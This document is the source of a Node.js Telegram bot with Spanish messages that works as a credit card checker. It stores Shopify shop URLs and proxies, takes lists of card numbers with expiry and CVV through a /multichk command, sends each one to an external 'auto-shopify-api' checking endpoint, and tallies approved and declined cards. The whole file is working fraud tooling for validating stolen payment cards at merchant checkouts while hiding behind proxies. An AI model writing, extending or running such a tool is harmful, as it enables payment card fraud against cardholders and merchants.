require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

/* ================== ENV ================== */
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

/* ================== BOT ================== */
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================== DATA ================== */
const DATA_FILE = './data.json';
let data = loadData();
const running = {}; // runtime only

function loadData() {
  if (fs.existsSync(DATA_FILE)) {
    return JSON.parse(fs.readFileSync(DATA_FILE));
  }
  return { sites: [], proxies: [] };
}

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

/* ================== API ================== */
async function callChkAPI({ site, cc, proxy }) {
  try {
    const res = await axios.get(API_BASE, {
      params: { site, cc, proxy },
      timeout: 30000
    });

    const d = res.data || {};
    const response = String(d.Response || '').toUpperCase();

    return {
      approved: response.includes('APPRO'),
      response,
      gateway: d.Gateway || 'N/A',
      price: d.Price || 'N/A',
      cc
    };
  } catch {
    return { approved: false, response: 'API_ERROR', cc };
  }
}

/* ================== START ================== */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 Bot activo

Comandos:
/addsites
/addproxies
/status
/multichk <cc|mm|yy|cvv>
/stop`
  );
});

/* ================== STATUS ================== */
bot.onText(/\/status/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    `🌐 Sites: ${data.sites.length}\n🧰 Proxies: ${data.proxies.length}`
  );
});

/* ================== ADD SITES ================== */
bot.onText(/\/addsites([\s\S]*)/, (msg, match) => {
  const input = match[1]?.trim();
  if (!input) return bot.sendMessage(msg.chat.id, 'Envía sites en líneas');

  const lines = input.split('\n').map(x => x.trim()).filter(Boolean);
  let added = 0;

  for (const site of lines) {
    if (!data.sites.includes(site)) {
      data.sites.push(site);
      added++;
    }
  }

  saveData();
  bot.sendMessage(msg.chat.id, `🌐 Sites añadidos: ${added}`);
});

/* ================== ADD PROXIES ================== */
bot.onText(/\/addproxies([\s\S]*)/, (msg, match) => {
  const input = match[1]?.trim();
  if (!input) return bot.sendMessage(msg.chat.id, 'Envía proxies en líneas');

  const lines = input.split('\n').map(x => x.trim()).filter(Boolean);
  let added = 0;

  for (const proxy of lines) {
    if (!data.proxies.includes(proxy)) {
      data.proxies.push(proxy);
      added++;
    }
  }

  saveData();
  bot.sendMessage(msg.chat.id, `🧰 Proxies añadidos: ${added}`);
});

/* ================== MULTICHK ================== */
bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!data.sites.length || !data.proxies.length) {
    return bot.sendMessage(chatId, '❌ Agrega sites y proxies primero');
  }

  const input = match[1]?.trim();
  if (!input) return bot.sendMessage(chatId, 'Envía CCs');

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);

  running[chatId] = true;

  let approved = 0;
  let declined = 0;

  const progress = await bot.sendMessage(chatId, `⏳ 0/${ccs.length}`);

  for (let i = 0; i < ccs.length; i++) {
    if (!running[chatId]) break;

    const r = await callChkAPI({
      site: data.sites[0],
      cc: ccs[i],
      proxy: data.proxies[0]
    });

    if (r.approved) approved++;
    else declined++;

    await bot.editMessageText(
      `⏳ ${i + 1}/${ccs.length}\n✅ ${approved} ❌ ${declined}`,
      { chat_id: chatId, message_id: progress.message_id }
    );
  }

  running[chatId] = false;

  bot.sendMessage(
    chatId,
    `✅ Finalizado\nAprobadas: ${approved}\nRechazadas: ${declined}`
  );
});

/* ================== STOP ================== */
bot.onText(/\/stop/, (msg) => {
  running[msg.chat.id] = false;
  bot.sendMessage(msg.chat.id, '⛔ Proceso detenido');
});
